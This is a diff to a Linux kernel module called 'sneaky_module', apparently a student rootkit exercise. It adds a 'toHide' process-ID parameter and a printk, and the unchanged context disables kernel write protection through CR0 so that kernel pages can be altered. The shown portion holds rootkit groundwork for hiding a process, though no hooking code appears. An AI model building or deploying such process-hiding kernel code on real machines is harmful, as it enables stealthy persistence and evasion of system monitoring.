@@ -1,4 +1,6 @@
 #include <linux/module.h>      // for all modules 
+#include <linux/moduleparam.h>
+#include <linux/stat.h>
 #include <linux/init.h>        // for entry/exit macros 
 #include <linux/kernel.h>      // for printk and other kernel bits 
 #include <asm/current.h>       // process information
@@ -15,6 +17,13 @@
 //so that we can change the read/write permissions of kernel pages.
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
+
+//To save the pid of the initial process
+static int toHide;
+
+module_param(toHide, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
+MODULE_PARM_DESC(toHide, "process pid");
+
 
 //These are function pointers to the system calls that change page
 //permissions for the given address (page) to read-only or read-write.
@@ -70,6 +79,9 @@ static int initialize_sneaky_module(void)
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
+  //Print the pid
+  printk(KERN_INFO "process PID = %d \n",toHide);
+
   return 0;       // to show a successful load 
 }  
 
@@ -102,4 +114,3 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
-
